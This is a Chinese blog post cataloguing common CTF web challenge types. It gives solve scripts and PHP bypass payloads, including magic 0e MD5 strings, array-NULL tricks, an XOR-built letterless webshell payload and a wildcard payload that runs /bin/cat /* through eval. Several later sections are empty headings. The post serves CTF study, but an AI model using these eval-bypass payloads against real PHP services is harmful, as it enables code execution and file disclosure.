﻿---
title: CTF中Web题目的常见题型及解题技巧
tags: [ctf]
categories: CTF
description: CTF中Web题目的常见题型及解题技巧
date: 2020/5/19 17:00:00
---

### 基础知识类题目

考察基本的查看网页源代码、HTTP请求、修改页面元素等。

这些题很简单，比较难的比赛应该不会单独出，就算有应该也是Web的签到题。

实际做题的时候基本都是和其他更复杂的知识结合起来出现。

#### 查看网页源代码

按F12就都看到了，flag一般都在注释里，有时候注释里也会有一条hint或者是对解题有用的信息。

- Bugku web2: http://123.206.87.240:8002/web2/
- Bugku web3: http://123.206.87.240:8002/web3/

#### 发送HTTP请求

可以用hackbar，有的也可以写脚本。

- Bugku web基础$_GET: http://123.206.87.240:8002/get/
- Bugku web基础$_POST: http://123.206.87.240:8002/post/
- Bugku 点击一百万次: http://123.206.87.240:9001/test/

举个写脚本的例子，（题目是Bugku web基础$POST）：
```python
import requests
r = requests.post('http://123.206.87.240:8002/post/', data={'what' : 'flag'})
print(r.text)
```

#### 不常见类型的请求发送

考OPTIONS请求，如果要发送这类请求，写一个脚本应该就能解决了。

#### HTTP头相关的题目

主要是查看和修改HTTP头。

目前做过的Web题目有很大一部分都是与HTTP头相关的，而且这种题目也相当常见，不和其他知识结合的情况下也算是属于基础题的范畴吧。

**技巧**：不同的类型有不同的利用方法，基本都离不开抓包改包，有些简单的也可以利用浏览器F12的网络标签解决。 但是最根本的应对策略，是熟悉一些常见请求头的格式、作用等，这样题目考到的时候就很容易知道要怎样做了。

#### 查看响应头

有时候响应头里会有hint或者题目的关键信息，也有的时候会直接把flag放在响应头里给你，但是直接查看响应头拿flag的题目并不多，因为太简单了。

只是查看的话，可以不用抓包，用F12的“网络”标签就可以解决了。

- Bugku 头等舱: http://123.206.87.240:9009/hd.php

#### 修改请求头、伪造Cookie

常见的有set-cookie、XFF和Referer，总之考法很灵活，做法比较固定，知道一些常见的请求头再根据题目随机应变就没问题了。

有些题目还需要伪造Cookie，根据题目要求做就行了。

可以用BurpSuite抓包，也可以直接在浏览器的F12“网络”标签里改。

- 实验吧 头有点大： http://ctf5.shiyanbar.com/sHeader/
- Bugku 程序员本地网站： http://123.206.87.240:8002/localhost/
- Bugku 管理员系统： http://123.206.31.85:1003/
- XCTF xff_referer： https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=0&id=5068

#### Git源码泄露

flag一般在源码的某个文件里，但也有和其他知识结合、需要进一步利用的情况，比如XCTF社区的mfw这道题。

**技巧**：GitHack一把梭

- XCTF mfw: https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5002

#### Python爬虫信息处理

这类题目一般都是给一个页面，页面中有算式或者是一些数字，要求在很短的时间内求出结果并提交，如果结果正确就可以返回flag。

因为所给时间一般都很短而且计算比较复杂，所以只能写脚本。这种题目的脚本一般都需要用到requests库和BeautifulSoup库（或者re库（正则表达式）），个人感觉使用BeautifulSoup简单一些。

**技巧**：requests库和BeautifulSoup库熟练掌握后，再多做几道题或者写几个爬虫的项目，一般这类题目就没有什么问题了。主要还是对BeautifulSoup的熟练掌握，另外还需要一点点web前端（HTML）的知识。

- Bugku 秋名山老司机： http://123.206.87.240:8002/qiumingshan/

```python
#这道题的脚本如下，还可以继续优化
#经常出现执行了但是不弹flag的情况，多试几次就行了
from bs4 import BeautifulSoup
import requests

r = requests.Session()
s = r.get("http://123.206.87.240:8002/qiumingshan/")
s.encoding = 'utf-8'
text = s.text
soup = BeautifulSoup(text)
tag = soup.div
express = str(tag.string)
express = express[0 : -3]
answer = eval(express)
ans = {"value" : answer}
flag = r.post('http://123.206.87.240:8002/qiumingshan/', data = ans)
print(flag.text)
```

- 实验吧 速度爆破： http://www.shiyanbar.com/ctf/1841
HGAME2019的部分题目似乎还出现了反爬虫措施。

#### PHP代码审计

代码审计覆盖面特别广，分类也很多，而且几乎什么样的比赛都会有，算是比较重要的题目类型之一吧。

**技巧**：具体问题具体分析，归根结底还是要熟练掌握PHP这门语言，了解一些常见的会造成漏洞的函数及利用方法等。

### hash加密相关

#### PHP弱类型hash比较缺陷

这是代码审计最基础的题目了，也比较常见。

典型代码：
```php
if(md5($a) == md5($b)) {    //注意两个等号“==”
    echo $flag;
}
```

加密函数也有可能是sha1或者其他的，但是原理都是不变的。

这个漏洞的原理如下：

```php
== 在进行比较的时候，会先将两边的变量类型转化成相同的，再进行比较。
0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0。
```

所以只要让b在经过相应的函数加密之后都是以0e开头就可以。

以下是一些md5加密后开头为0e的字符串：

```php
QNKCDZO
0e830400451993494058024219903391

s878926199a
0e545993274517709034328855841020

s155964671a
0e342768416822451524974117254469

s214587387a
0e848240448830537924465865611904

s214587387a
0e848240448830537924465865611904

s878926199a
0e545993274517709034328855841020

s1091221200a
0e940624217856561557816327384675

s1885207154a
0e509367213418206700842008763514

aabg7XSs
```
另外，这个也可以用数组绕过，这个方法在下面会详细说。

### 数组返回NULL绕过

PHP绝大多数函数无法处理数组，向md5函数传入数组类型的参数会使md5()函数返回NULL（转换后为False），进而绕过某些限制。

如果上面的代码变成：
```php
if(md5($a) === md5($b)) {       //两个等号变成三个
    echo $flag;
}
```

那么利用弱类型hash比较缺陷将无法绕过，这时可以使用数组绕过。

传入?a[]=1&b[]=2就可以成功绕过判断。

这样的方法也可以用来绕过sha1()等hash加密函数相关的判断，也可以绕过正则判断，可以根据具体情况来灵活运用。

### 正则表达式相关

#### ereg正则%00截断

ereg函数存在NULL截断漏洞，使用NULL可以截断过滤，所以可以使用%00截断正则匹配。

- Bugku ereg正则%00截断：http://123.206.87.240:9009/5.php

#### 数组绕过

正则表达式相关的函数也可以使用数组绕过过滤，绕过方法详见数组返回NULL绕过。

上面那道题也可以用数组绕过。

#### 单引号绕过preg_match()正则匹配

在每一个字符前加上单引号可以绕过preg_match的匹配，原理暂时不明。

例如有如下代码：
```php
<?php
    $p = $_GET['p'];
    if (preg_match('/[0-9a-zA-Z]{2}/',$p) === 1) {
        echo 'False';
    } else {
        $pp = trim(base64_decode($p));
        if ($pp === 'flag.php') {
            echo 'success';
        }
    }
?>
```

```php
payload：p='Z'm'x'h'Z'y'5'w'a'H'A'=
```

#### 不含数字与字母的WebShell

如果题目使用preg_match()过滤掉了所有的数字和字母，但是没有过滤PHP的变量符号$，可以考虑使用这种方法。

典型代码：
```php
<?php

include'flag.php';

if(isset($_GET['code'])){
   $code=$_GET['code'];
   if(strlen($code)>50){
       die("Too Long.");
  }
   if(preg_match("/[A-Za-z0-9_]+/",$code)){
       die("Not Allowed.");
  }
   @eval($code);
}else{
   highlight_file(__FILE__);
}
//$hint = "php function getFlag() to get flag";
?>
```

这种方法的核心是**字符串的异或操作**。

爆破脚本：
```php
chr1 = ['@', '!', '"', '#', '$', '%', '&', '\'', '(', ')', '*', '+', ',', '-', '.', '/', ':', ';', '<', '=', '>', '?', '[', '\\', ']', '^', '_', '`', '{', '|', '}', '~']
chr2 = ['@', '!', '"', '#', '$', '%', '&', '\'', '(', ')', '*', '+', ',', '-', '.', '/', ':', ';', '<', '=', '>', '?', '[', '\\', ']', '^', '_', '`', '{', '|', '}', '~']

for i in chr1 :
    for j in chr2 :
        print(i + 'xor' + j + '=' + (chr(ord(i) ^ ord(j))))
```

根据题目的要求，用异或出来的字符串拼出合适的Payload，并放在PHP变量中执行。变量名可以用中文。

比如这道题的
```php
Payload：?code=$啊="@@^|@@@"^"'%*:,!'";$啊();
```

#### Linux通配符绕过正则匹配

典型代码如下，与前一种题目非常相似，但也不大一样：

```php
<?php

if(isset($_GET['code'])){
   $code=$_GET['code'];
   if(strlen($code)>50){
       die("Too Long.");
  }
   if(preg_match("/[A-Za-z0-9_$]+/",$code)){
       die("Not Allowed.");
  }
   @eval($code);
}else{
   highlight_file(__FILE__);
}
//flag in /
?>
```

最主要的区别就是过滤了**$**和**_**，也就是说无法使用变量符号$了。

这时候可以考虑采用**通配符**绕过。

通配符有点像正则表达式，有自己的匹配规则，看这张图：

所以构造一下通配符就是
```php
/???/??? /*
```

因为过滤了变量符号，没法通过上面那种方法来执行了。但是，可以通过闭合PHP标记来执行，
也就是：?><?=/???/??? /*?>（/bin/cat /*）。

所以本题的
```php
payload为：?code=?><?=/???/??? /*?>
```

具体解法可以参照此篇文章的前两道题目：
https://www.jianshu.com/p/ecc2414ec110


### 命令执行漏洞

#### assert()函数引起的命令执行

#### XSS题目

#### 绕过waf

#### 长度限制

#### 双写

#### 等价替代

#### URL编码绕过

#### Linux命令使用反斜杠绕过

#### URL二次解码绕过

#### 数组绕过

### SQL注入

#### 使用sqlmap